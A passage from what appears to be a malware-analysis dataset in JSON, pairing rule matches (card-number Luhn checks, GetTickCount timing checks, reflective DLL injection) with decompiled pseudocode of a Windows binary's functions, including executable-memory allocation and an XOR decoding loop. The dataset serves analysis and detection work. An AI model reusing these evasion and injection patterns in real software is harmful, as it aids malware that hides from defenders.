// WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xfffdf485:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    *(arg_8h + 0x20) = *(arg_8h + 0x20);\n    *(arg_8h + 0x1c) = *(arg_8h + 0x1c);\n    arg_ch[1] = iVar2;\n    arg_ch[2] = arg_ch[2] + (iVar1 - *arg_ch);\n    *arg_ch = iVar1;\n    *(arg_8h + 0x34) = uVar3;\n    fcn.00406550(arg_8h, arg_ch, 0xfffffffe);\n    return;\n}\n",
        "token_count": 578
    },
    "00409300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.00409300(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_ch[1];\n    iVar2 = *arg_ch;\n    uVar3 = arg_8h[0xd];\n    if (9 < *arg_8h) {\n        arg_8h[8] = arg_8h[8];\n        arg_8h[7] = arg_8h[7];\n        arg_ch[1] = iVar1;\n        iVar1 = *arg_ch;\n        *arg_ch = iVar2;\n        arg_ch[2] = arg_ch[2] + (iVar2 - iVar1);\n        arg_8h[0xd] = uVar3;\n        fcn.00406550(arg_8h, arg_ch, 0xfffffffe);\n        return;\n    }\n    switch(*(*arg_8h * 4 + 0x409098)) {\n    case 0xaeb48c2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b0573d0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3bd18b12:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x468b05eb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x468b284e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48c22b05:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x563bf445:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74c13b30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x89c22b2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b1f752c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n}\n",
        "token_count": 560
    },
    "00401c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401c60(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (**0x44002c)(0, 2000, 0x3000, 0x40, 0);\n    iVar2 = (**0x44004c)(uVar1);\n    if (iVar2 == 0) {\n        (**0x440054)(0);\n    }\n    iVar2 = (**0x440010)(0, 399000000, 0x3000, 4);\n    if (iVar2 != 0) {\n        fcn.0042a6e0(iVar2, 0, 99000000);\n        iVar2 = (**0x44000c)(iVar2, 399000000, 0x8000);\n    }\n    return iVar2;\n}\n",
        "token_count": 187
    },
    "00401d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d60(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint arg_8h_00;\n    uint var_3f8h;\n    uint var_3f4h;\n    uint var_3f0h;\n    uint var_3ech;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    iVar3 = 1000;\n    puVar1 = &var_3ech;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    arg_8h_00 = 0x440218;\n    (**0x44001c)(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    iVar3 = (**0x440018)(0x40, arg_10h + 1);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    *(arg_10h + iVar3) = 0;\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    uVar4 = 0;\n    if (arg_10h != 0) {\n        do {\n            fcn.004208a0(&var_3ech);\n            fcn.004208a0(&var_3ech);\n            uVar2 = fcn.004208a0(arg_ch);\n            *(uVar4 + iVar3) = *(uVar4 % uVar2 + arg_ch) ^ (uVar4 + iVar3)[arg_8h - iVar3];\n            fcn.004208a0(&var_3ech);\n            fcn.004208a0(&var_3ech);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < arg_10h);\n    }\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.004208a0(&var_3ech);\n    fcn.0042a6e0(&var_3ech, 0, 1000);\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 691
    },
    "004053d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004053d0(code *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int32_t unaff_EDI;\n    \n    if ((arg_10h & 2) == 0) {\n        iVar1 = (*arg_8h)(*(unaff_EDI + 0x144), 0, *(unaff_EDI + 0x140) + *(unaff_EDI + 0x13c), arg_ch);\n        if (iVar1 == 0) {\n            return 1;\n        }\n    }\n    uVar3 = 0;\n    if (*(unaff_EDI + 0x46) != 0) {\n        puVar4 = *(unaff_EDI + 0x138) + 0x10;\n        do {\n            uVar2 = puVar4[-2];\n            if (*puVar4 <= puVar4[-2]) {\n                uVar2 = *puVar4;\n            }\n            if (uVar2 != 0) {\n                iVar1 = (*arg_8h)(puVar4[-1] + *(unaff_EDI + 0x144), puVar4[1], uVar2, arg_ch);\n                if (iVar1 == 0) {\n                    return 1;\n                }\n            }\n            uVar3 = uVar3 + 1;\n            puVar4 = puVar4 + 10;\n        } while (uVar3 < *(unaff_EDI + 0x46));\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "00405910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405910(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    if (arg_10h != 0) {\n        if (arg_14h[1] <= arg_ch + arg_10h && arg_ch + arg_10h != arg_14h[1]) {\n            return 0;\n        }\n        fcn.0042a840(arg_8h, *arg_14h + arg_ch, arg_10h);\n    }\n    return 1;\n}\n",
        "token_count": 129
    },
    "00405950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405950(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    fcn.00405780(0x404d10, &var_8h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 102
    },
    "00405980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405980(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (arg_8h == 0) {\n        return arg_8h;\n    }\n    if (arg_10h < 0x10000) {\n        uVar2 = *(arg_8h + 0x10 + arg_ch);\n        if (arg_10h < uVar2) {\n            return 0;\n        }\n        arg_10h = arg_10h - uVar2;\n    }\n    else {\n        uVar2 = 0;\n        if (*(arg_8h + 0x18 + arg_ch) != 0) {\n            do {\n                iVar1 = (**0x463068)(*(*(arg_8h + 0x20 + arg_ch) + uVar2 * 4 + arg_ch) + arg_ch, arg_10h);\n                if (iVar1 == 0) {\n                    arg_10h = *(*(arg_8h + 0x24 + arg_ch) + uVar2 * 2 + arg_ch);\n                    break;\n                }\n                uVar2 = uVar2 + 1;\n            } while (uVar2 < *(arg_8h + 0x18 + arg_ch));\n        }\n    }\n    if (*(arg_8h + 0x14 + arg_ch) <= arg_10h) {\n        return 0;\n    }\n    return *(*(arg_8h + 0x1c + arg_ch) + arg_10h * 4 + arg_ch) + arg_ch;\n}\n",
        "token_count": 372
    },
    "00405a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a20(int32_t arg_8h, uint arg_ch)\n\n{\n    fcn.00405980(*(arg_8h + 0x14), *(arg_8h + 8), arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "00405ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ac0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    \n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.00429bcb(0x4452c0);\n        arg_8h = extraout_ECX;\n    }\n    uVar3 = piVar2 - arg_8h;\n    if (uVar3 < arg_ch) {\n        arg_ch = uVar3;\n    }\n    if (arg_ch != 0) {\n        ppiVar4 = in_ECX;\n        ppiVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar1 = *in_ECX;\n        }\n        fcn.0042adb0(ppiVar4 + arg_8h, ppiVar1 + arg_8h + arg_ch, uVar3 - arg_ch);\n        piVar2 = in_ECX[4] - arg_ch;\n        in_ECX[4] = piVar2;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar2) = 0;\n            return;\n        }\n        *(in_ECX + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "00405d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d10(uint *param_1)\n\n{\n    if (0xf < param_1[5]) {\n        fcn.0042a679(*param_1);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = 0;\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 82
    },
    "00405df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405df0(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    uint *puVar5;\n    ulong uVar6;\n    \n    uVar2 = arg_8h[4];\n    uVar4 = arg_ch;\n    puVar5 = arg_8h;\n    if (uVar2 < arg_ch) {\n        uVar6 = fcn.00429bcb(0x4452c0);\n        puVar5 = uVar6 >> 0x20;\n        uVar2 = uVar6;\n        uVar4 = extraout_ECX;\n    }\n    if (uVar2 - uVar4 < arg_10h) {\n        arg_10h = uVar2 - uVar4;\n    }\n    uVar6 = CONCAT44(puVar5, in_ECX[4]);\n    if (-in_ECX[4] - 1U <= arg_10h) {\n        uVar6 = fcn.00429b7e(0x4452ec);\n    }\n    if (arg_10h != 0) {\n        piVar1 = uVar6 + arg_10h;\n        if (piVar1 == 0xffffffff) {\n            uVar6 = fcn.00429b7e(0x4452ec);\n        }\n        puVar5 = uVar6 >> 0x20;\n        if (in_ECX[5] < piVar1) {\n            fcn.00405ba0(piVar1, uVar6);\n            puVar5 = arg_8h;\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        if (0xf < puVar5[5]) {\n            puVar5 = *puVar5;\n        }\n        ppiVar3 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n        }\n        fcn.0042a840(in_ECX[4] + ppiVar3, puVar5 + arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 639
    },
    "00405ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ee0(int32_t *arg_8h, int32_t **arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t **ppiVar4;\n    int32_t **ppiVar5;\n    int32_t **in_ECX;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *piVar6;\n    \n    piVar6 = in_ECX[4];\n    if ((piVar6 < arg_8h) || (arg_ch[4] < arg_10h)) {\n        fcn.00429bcb(0x4452c0);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar3 = arg_ch[4] - arg_10h;\n    if (uVar3 < arg_14h) {\n        arg_14h = uVar3;\n    }\n    if (-piVar6 - 1U <= arg_14h) {\n        fcn.00429b7e(0x4452ec);\n        piVar6 = extraout_ECX;\n    }\n    if (arg_14h != 0) {\n        piVar1 = piVar6 + arg_14h;\n        if (piVar1 == 0xffffffff) {\n            fcn.00429b7e(0x4452ec);\n            piVar6 = extraout_ECX_00;\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405ba0(piVar1, piVar6);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar4 = in_ECX;\n        ppiVar5 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n            ppiVar5 = *in_ECX;\n        }\n        fcn.0042adb0(ppiVar4 + arg_8h + arg_14h, ppiVar5 + arg_8h, in_ECX[4] - arg_8h);\n        if (in_ECX == arg_ch) {\n            piVar6 = arg_10h + arg_14h;\n            if (arg_10h <= arg_8h) {\n                piVar6 = arg_10h;\n            }\n            if (in_ECX[5] < 0x10) {\n                fcn.0042adb0(in_ECX + arg_8h, in_ECX + piVar6, arg_14h);\n            }\n            else {\n                fcn.0042adb0(*in_ECX + arg_8h, *in_ECX + piVar6, arg_14h);\n            }\n        }\n        else {\n            if (0xf < arg_ch[5]) {\n                arg_ch = *arg_ch;\n            }\n            ppiVar5 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                ppiVar5 = *in_ECX;\n            }\n            fcn.0042a840(ppiVar5 + arg_8h, arg_ch + arg_10h, arg_14h);\n        }\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "00406060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406060(int32_t *arg_8h, int32_t **arg_ch, uint32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    \n    if (arg_ch != NULL) {\n        piVar2 = in_ECX[5];\n        ppiVar4 = in_ECX;\n        if (0xf < piVar2) {\n            ppiVar4 = *in_ECX;\n        }\n        if (ppiVar4 <= arg_ch) {\n            ppiVar4 = in_ECX;\n            if (0xf < piVar2) {\n                ppiVar4 = *in_ECX;\n            }\n            if (arg_ch < in_ECX[4] + ppiVar4) {\n                ppiVar4 = in_ECX;\n                if (0xf < piVar2) {\n                    ppiVar4 = *in_ECX;\n                }\n                fcn.00405ee0(arg_8h, in_ECX, arg_ch - ppiVar4, arg_10h);\n                return;\n            }\n        }\n    }\n    piVar2 = in_ECX[4];\n    if (piVar2 < arg_8h) {\n        piVar2 = fcn.00429bcb(0x4452c0);\n    }\n    uVar5 = arg_10h;\n    if (-piVar2 - 1U <= arg_10h) {\n        piVar2 = fcn.00429b7e(0x4452ec);\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar2 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar2 = fcn.00429b7e(0x4452ec);\n        }\n        if (in_ECX[5] < piVar1) {\n            fcn.00405ba0(piVar1, piVar2);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            in_ECX[4] = NULL;\n            if (in_ECX[5] < 0x10) {\n                *in_ECX = 0;\n                return;\n            }\n            **in_ECX = 0;\n            return;\n        }\n        ppiVar3 = in_ECX;\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar3 = *in_ECX;\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042adb0(ppiVar3 + arg_8h + arg_10h, ppiVar4 + arg_8h, in_ECX[4] - arg_8h);\n        ppiVar4 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            ppiVar4 = *in_ECX;\n        }\n        fcn.0042a840(ppiVar4 + arg_8h, arg_ch, arg_10h);\n        in_ECX[4] = piVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + piVar1) = 0;\n            return;\n        }\n        *(in_ECX + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "004061b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061b0(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < arg_ch) {\n        fcn.00429bcb(0x4452c0);\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - arg_ch;\n    if (arg_10h < piVar2) {\n        piVar2 = arg_10h;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.00405ac0(piVar2 + arg_ch, 0xffffffff);\n        fcn.00405ac0(0, arg_ch);\n        return;\n    }\n    if (piVar2 == 0xffffffff) {\n        fcn.00429b7e(0x4452ec);\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.00405ba0(piVar2, in_ECX[4]);\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0xf < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    fcn.0042a840(arg_8h_00, ppiVar1 + arg_ch, piVar2);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + piVar2) = 0;\n        return;\n    }\n    *(*in_ECX + piVar2) = 0;\n    return;\n}\n",
        "token_count": 575
    },
    "004062a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004062a0(int32_t **arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **in_ECX;\n    \n    if (arg_8h != NULL) {\n        piVar1 = in_ECX[5];\n        ppiVar2 = in_ECX;\n        if (0xf < piVar1) {\n            ppiVar2 = *in_ECX;\n        }\n        if (ppiVar2 <= arg_8h) {\n            ppiVar2 = in_ECX;\n            if (0xf < piVar1) {\n                ppiVar2 = *in_ECX;\n            }\n            if (arg_8h < in_ECX[4] + ppiVar2) {\n                if (0xf < piVar1) {\n                    fcn.004061b0(in_ECX, arg_8h - *in_ECX, arg_ch);\n                    return;\n                }\n                fcn.004061b0(in_ECX, arg_8h - in_ECX, arg_ch);\n                return;\n            }\n        }\n    }\n    if (arg_ch == 0xffffffff) {\n        fcn.00429b7e(0x4452ec);\n    }\n    if (in_ECX[5] < arg_ch) {\n        fcn.00405ba0(arg_ch, in_ECX[4]);\n        if (arg_ch == NULL) {\n            return;\n        }\n    }\n    else if (arg_ch == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    ppiVar2 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        ppiVar2 = *in_ECX;\n    }\n    fcn.0042a840(ppiVar2, arg_8h, arg_ch);\n    in_ECX[4] = arg_ch;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + arg_ch) = 0;\n        return;\n    }\n    *(*in_ECX + arg_ch) = 0;\n    return;\n}\n",
        "token_count": 509
    },
    "004063a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063a0(uint arg_8h)\n\n{\n    uint arg_ch;\n    uchar *in_ECX;\n    \n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    arg_ch = fcn.0042ad20(arg_8h);\n    fcn.004062a0(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 107
    },
    "004063e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063e0(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    if (in_ECX != arg_8h) {\n        if (0xf < in_ECX[5]) {\n            fcn.0042a679(*in_ECX);\n        }\n        in_ECX[5] = 0xf;\n        in_ECX[4] = 0;\n        *in_ECX = 0;\n        if (arg_8h[5] < 0x10) {\n            fcn.0042adb0(in_ECX, arg_8h, arg_8h[4] + 1);\n        }\n        else {\n            *in_ECX = *arg_8h;\n            *arg_8h = 0;\n        }\n        in_ECX[4] = arg_8h[4];\n        in_ECX[5] = arg_8h[5];\n        arg_8h[4] = 0;\n        arg_8h[5] = 0;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00406490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00406490(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0042ad20(arg_ch);\n    uVar1 = fcn.00406060(0, arg_ch, uVar1);\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    fcn.004063e0(uVar1);\n    return arg_8h;\n}\n",
        "token_count": 143
    },
    "00406550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406550(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t arg_ch_00;\n    uint32_t uVar2;\n    uint32_t arg_10h_00;\n    uint32_t uVar3;\n    int32_t var_4h;\n    \n    var_4h = *(arg_ch + 0xc);\n    uVar2 = *(arg_8h + 0x34);\n    arg_ch_00 = *(arg_8h + 0x30);\n    if (uVar2 < arg_ch_00) {\n        uVar2 = *(arg_8h + 0x2c);\n    }\n    uVar3 = *(arg_ch + 0x10);\n    arg_10h_00 = uVar2 - arg_ch_00;\n    if (uVar3 < uVar2 - arg_ch_00) {\n        arg_10h_00 = uVar3;\n    }\n    if ((arg_10h_00 != 0) && (arg_10h == -5)) {\n        arg_10h = 0;\n    }\n    *(arg_ch + 0x14) = *(arg_ch + 0x14) + arg_10h_00;\n    *(arg_ch + 0x10) = uVar3 - arg_10h_00;\n    if (*(arg_8h + 0x38) != NULL) {\n        uVar1 = (**(arg_8h + 0x38))(*(arg_8h + 0x3c), arg_ch_00, arg_10h_00);\n        *(arg_8h + 0x3c) = uVar1;\n        *(arg_ch + 0x30) = uVar1;\n    }\n    if (arg_10h_00 != 0) {\n        fcn.0042a840(var_4h, arg_ch_00, arg_10h_00);\n        var_4h = var_4h + arg_10h_00;\n        arg_ch_00 = arg_ch_00 + arg_10h_00;\n    }\n    if (arg_ch_00 == *(arg_8h + 0x2c)) {\n        arg_ch_00 = *(arg_8h + 0x28);\n        if (*(arg_8h + 0x34) == *(arg_8h + 0x2c)) {\n            *(arg_8h + 0x34) = arg_ch_00;\n        }\n        uVar2 = *(arg_ch + 0x10);\n        uVar3 = *(arg_8h + 0x34) - arg_ch_00;\n        if (uVar2 < uVar3) {\n            uVar3 = uVar2;\n        }\n        if ((uVar3 != 0) && (arg_10h == -5)) {\n            arg_10h = 0;\n        }\n        *(arg_ch + 0x14) = *(arg_ch + 0x14) + uVar3;\n        *(arg_ch + 0x10) = uVar2 - uVar3;\n        if (*(arg_8h + 0x38) != NULL) {\n            uVar1 = (**(arg_8h + 0x38))(*(arg_8h + 0x3c), arg_ch_00, uVar3);\n            *(arg_8h + 0x3c) = uVar1;\n            *(arg_ch + 0x30) = uVar1;\n        }\n        if (uVar3 != 0) {\n            fcn.0042a840(var_4h, arg_ch_00, uVar3);\n            var_4h = var_4h + uVar3;\n            arg_ch_00 = arg_ch_00 + uVar3;\n        }\n    }\n    *(arg_ch + 0xc) = var_4h;\n    *(arg_8h + 0x30) = arg_ch_00;\n    return arg_10h;\n}\n",
        "token_count": 901
    },
    "00406660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406660(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *puVar1;\n    \n    puVar1 = (**(arg_18h + 0x20))(*(arg_18h + 0x28), 1, 0x1c);\n    if (puVar1 != NULL) {\n        *(puVar1 + 4) = arg_8h;\n        *(puVar1 + 0x11) = arg_ch;\n        *puVar1 = 0;\n        puVar1[5] = arg_10h;\n        puVar1[6] = arg_14h;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00406730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00406730(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, 0x40);\n    if (arg_8h_00 != NULL) {\n        iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 8, 0x5a0);\n        arg_8h_00[9] = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, arg_10h);\n            arg_8h_00[10] = iVar1;\n            if (iVar1 == 0) {\n                (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00[9]);\n                (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00);\n                return NULL;\n            }\n            arg_8h_00[0xb] = iVar1 + arg_10h;\n            arg_8h_00[0xe] = arg_ch;\n            *arg_8h_00 = 0;\n            fcn.004066a0(arg_8h_00, arg_8h, 0);\n            return arg_8h_00;\n        }\n        (**(arg_8h + 0x24))(*(arg_8h + 0x28), arg_8h_00);\n    }\n    return NULL;\n}\n",
        "token_count": 411
    },
    "00406e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
